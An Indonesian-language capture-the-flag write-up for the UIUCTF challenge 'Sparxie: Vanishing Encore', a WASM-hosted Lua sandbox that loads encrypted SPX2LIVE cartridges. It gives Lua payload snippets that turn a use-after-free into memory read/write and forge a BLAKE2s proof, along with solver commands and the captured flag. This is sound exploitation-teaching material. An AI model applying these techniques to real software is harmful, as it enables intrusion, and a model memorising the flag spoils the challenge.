# Sparxie: Vanishing Encore

## Ringkasan

Target menerima satu cartridge biner berformat `SPX2LIVE`, lalu menjalankan isi cartridge sebagai script Lua di sandbox Sparxie.

File yang penting:

- `sparxicle.js`
- `sparxicle.wasm`
- `spotlight.pass`
- `source/src/main.c`
- `source/src/cartridge.c`
- `source/src/spotlight.c`
- `source/js/host.js`

Goal exploit adalah memanggil jalur backstage:

```text
sparxie_redeem(...)
```

Kalau jalur ini terpanggil, program mencetak:

```text
[Sparxie] The final encore reached backstage.
<flag>
```

Flag remote yang diperoleh:

```text
uiuctf{c0m3_w17_h_5p4rx13_71ll_7h3_3nd_0f_7h3_w0rld}
```

---

## Proteksi / Karakter Target

Ini bukan ELF native biasa, jadi `checksec` tidak relevan seperti challenge pwn klasik. Target berjalan sebagai JavaScript/WASM:

- `sparxicle.js` — JavaScript glue/runtime
- `sparxicle.wasm` — WebAssembly module

Service remote menerima input lewat TLS:

```bash
ncat --ssl sparxie-vanishing-encore.chal.uiuc.tf 1337
```

`solve.py` memakai SSL bawaan Python dan juga menangani kCTF proof-of-work jika wrapper remote menampilkannya.

---

## Analisis Program

Entry point utama ada di:

```text
source/src/main.c
```

Program melakukan urutan ini:

1. Print banner.
2. Membaca satu cartridge dari stdin.
3. Mengecek magic `SPX2LIVE`.
4. Unpack cartridge menjadi source Lua.
5. Membuka sandbox Lua terbatas.
6. Load module `sparxie`.
7. Menjalankan Lua payload.

Bagian pembacaan cartridge:

```c
#define INPUT_LIMIT (96u * 1024u)
#define CARTRIDGE_HEADER_SIZE 32u
#define CARTRIDGE_MAGIC "SPX2LIVE"
```

Jika input diawali `SPX2LIVE`, program membaca panjang plaintext dari header dan mengambil body terenkripsi sepanjang itu.

Jadi exploit harus dikirim sebagai cartridge valid, bukan script Lua mentah.

---

## Format Cartridge SPX2LIVE

`source/src/cartridge.c` menunjukkan header cartridge berukuran 32 byte:

| Offset | Size | Field |
|---|---:|---|
| `0x00` | 8 | magic = `SPX2LIVE` |
| `0x08` | 4 | `plain_len` |
| `0x0c` | 4 | `nonce` |
| `0x10` | 4 | checksum plaintext |
| `0x14` | 4 | `header_tag` |
| `0x18` | 4 | `lanes`, harus `4` |
| `0x1c` | 4 | encore tag |

Plaintext Lua dienkripsi byte-by-byte memakai state 4 lane:

```c
unsigned lane = (i + (nonce & 3u)) & 3u;
state[lane] = mix(state[lane] + 0x9e3779b9 + i);
key = state[lane] >> ((i & 3u) * 8u);
plain[i] = input[HEADER_SIZE + i] ^ key ^ (i * 29u);
```

Agar cartridge diterima, solver harus menghitung ulang:

```text
checksum = checksum(plaintext, plain_len, nonce)
header_tag = mix(nonce ^ plain_len ^ 0xa11ce5ed)
encore = mix(checksum ^ nonce ^ 0xe1a7104e)
```

Fungsi `pack_lua()` di `solve.py` mengimplementasikan ulang semua logic ini, sehingga Lua exploit bisa dibungkus menjadi cartridge `SPX2LIVE` valid.

---

## Spotlight Pass

File `spotlight.pass` awalnya adalah pass catalogue dengan route archive:

```text
11 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
```

Masalahnya, pass archive hanya membuat:

```lua
sparxie.review(pass)
```

mengembalikan boolean.

Untuk `render()`, kita membutuhkan permit object yang valid.

### Analisis `spotlight.c`

Di `source/src/spotlight.c`, seal pass dihitung dari:

```text
SPARXIE::CATALOGUE::ARCHIVE
header + 8
body
```

Route tidak masuk ke `compute_seal()`.

Artinya, body dan seal pass catalogue masih bisa dipakai, lalu route diganti menjadi route relay yang valid.

Route relay yang dipakai solver:

```text
27 05 b9 89 3a fa b0 ed 0c 00 00 00 a2 05 85 c3
```

Setelah route ini dipakai:

```lua
sparxie.review(pass)
```

mengeluarkan object `Permit`, bukan boolean.

Permit ini dipakai untuk memanggil:

```lua
s:render(tl, permit)
```

---

## Vulnerability

Bug utamanya adalah **use-after-free / stale clip object** pada object studio.

Payload Lua membuat dua clip dan satu timeline:

```lua
local s=sparxie.studio()
local c1=s:clip(0,4096)
local c2=s:clip(0,4096)
local tl=sparxie.timeline({c1,c2})
s:render(tl,permit)
```

Setelah `render()`, internal studio/timeline diproses ulang.

Clip object lama masih bisa dipakai dari Lua sebagai `c1` dan `c2`, padahal backing memory-nya sudah tidak aman.

Ini memberi primitive write lewat:

```lua
c1:write(off, data)
c2:write(off, data)
```

---

## Primitive Read/Write

Setelah membuat draft dan queue:

```lua
local d=sparxie.draft()
local q=sparxie.queue(d)
```

Payload menulis patch ke banyak entry berjarak 64 byte:

```lua
local qpatch="\xa0\xee\x01\x00\x00\x40\x00\x00"

for i=0,62 do
  local off=i*64+16
  c1:write(off,qpatch)
  c2:write(off,qpatch)
end
```

Tujuannya membuat lens dari queue mempunyai range lebih besar sehingga dapat membaca/menulis area memory yang memuat object draft/user/authority pool.

Kemudian:

```lua
local l=q:lens()
```

Primitive tersebut menghasilkan arbitrary read/write relatif melalui `q:lens()`.

---

## Memory Scan

Exploit menggunakan marker object untuk menemukan offset authority dan user/draft:

```lua
local AUTH="\xa3\xc7\x51\x9e\xff\xff\x01\x00"
local USER="\xf2\xa6\xd8\x31\xff\xff\x01\x00"

for off=0,16000,272 do
  local m=l:read(off+260,8)

  if m==AUTH then
    auth=off
  end

  if m==USER then
    user=off
  end
end
```

Kalau kedua marker ditemukan, exploit memiliki offset object authority dan user/draft yang dibutuhkan.

---

## Bypass Publish Check

`draft:publish()` tidak langsung memanggil redeem. Ada pengecekan campaign, operation, dan proof.

Payload menulis campaign dan operation yang benar ke struktur user/draft:

```lua
local campaign="\x6f\x0b\xd4\x72\x9e\xc8\x31\x5a"
local op="\xc1\x25\x4e\xb7"

l:write(user+96,campaign..op)
```

Setelah itu proof dihitung ulang menggunakan BLAKE2s.

Karena sandbox Lua tidak menyediakan crypto, solver menyisipkan implementasi BLAKE2s murni Lua ke dalam payload.

Message proof yang dihitung:

```lua
local msg="SPARXIE::ENCORE::PROOF"
  ..l:read(auth,32)
  ..l:read(user,32)
  ..l:read(user+32,32)
  ..seal
  ..campaign
  ..op
  ..l:read(user+108,4)
```

Hash BLAKE2s hasilnya ditulis ke field proof:

```lua
l:write(user+64,blake2s(msg))
```

Setelah struktur sudah konsisten, pemanggilan:

```lua
d:publish()
```

lolos.

Kemudian host JS menjalankan:

```text
sparxie_redeem()
```

dan mencetak flag.

---

## Exploit Final

Exploit final ada di:

```text
solve.py
```

Isi utama solver:

1. Membuat Lua payload.
2. Membungkus payload menjadi cartridge `SPX2LIVE` valid.
3. Local mode menjalankan `node sparxicle.js`.
4. Remote mode konek TLS ke challenge.
5. Jika ada kCTF PoW, solver membaca challenge `s.<difficulty>.<value>` dan mengirim solusinya.
6. Mengirim cartridge final.
7. Mencetak output service.

---

## Cara Menjalankan

### Lokal

```bash
python3 solve.py
```

### Remote

```bash
python3 solve.py REMOTE HOST=sparxie-vanishing-encore.chal.uiuc.tf PORT=1337
```

### Tanpa TLS untuk testing wrapper lokal

```bash
python3 solve.py REMOTE HOST=127.0.0.1 PORT=1337 TLS=0
```

---

## Hasil Lokal

Dengan `flag.txt` lokal berisi fake flag:

```text
[*] cartridge size: 3660 bytes
[*] running local node process
+--------------------------------------------------+
|        SPARXICLE LIVE - VANISHING ENCORE         |
|            PARTY TILL THE WORLD ENDS!            |
+--------------------------------------------------+
[catalogue] one Spotlight Pass remains
[studio] upload one SPX2 creator cartridge:
[Sparxie] The final encore reached backstage.
uiuctf{fake_local_flag}
[analytics] backstage witness 996c7652
[studio] stream ended
```

---

## Hasil Remote

Remote mengeluarkan flag asli:

```text
uiuctf{c0m3_w17_h_5p4rx13_71ll_7h3_3nd_0f_7h3_w0rld}
```

---

